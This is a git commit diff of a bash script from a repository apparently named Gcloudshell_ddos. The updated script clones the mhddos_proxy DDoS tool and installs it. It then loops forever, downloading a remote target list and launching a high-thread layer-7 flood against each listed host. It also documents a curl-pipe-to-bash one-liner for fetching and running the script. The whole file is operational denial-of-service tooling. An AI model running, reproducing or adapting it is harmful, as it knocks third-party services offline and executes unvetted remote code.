a042667227d9b57e137752613eea67923ce85330
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-06-09 02:28:56 +0300

    Update Start_L7_test.sh

--- Start_L7_test.sh
+++ Start_L7_test.sh
@@ -1,14 +1,29 @@
 #!/bin/bash
-#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7_test.sh | bash
+#curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L7m.sh | bash
 rm -rf mhddos_proxy
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
+threads="${1:-1000}"; threads="-t $threads"
+rpc="--rpc 350"
+debug="--lang en"
+vpn="--vpn 5"
+
 while true
 do
    pkill -f runner.py
-   sleep 7
-   ./runner.sh python3 runner.py -c https://gist.githubusercontent.com/ddosukraine2022/f739250dba308a7a2215617b17114be9/raw/mhdos_targets_url_v2.txt -t 500 --http-methods GET STRESS --vpn 1 --debug
-sleep 9m
+   sleep 10
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]" | wc -l)
+      done
+   for (( i=1; i<=list_size; i++ ))
+      do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
+            python3 ~/mhddos_proxy/runner.sh $rpc $cmd_line $threads $vpn $debug&
+      done
+sleep 14m
 done
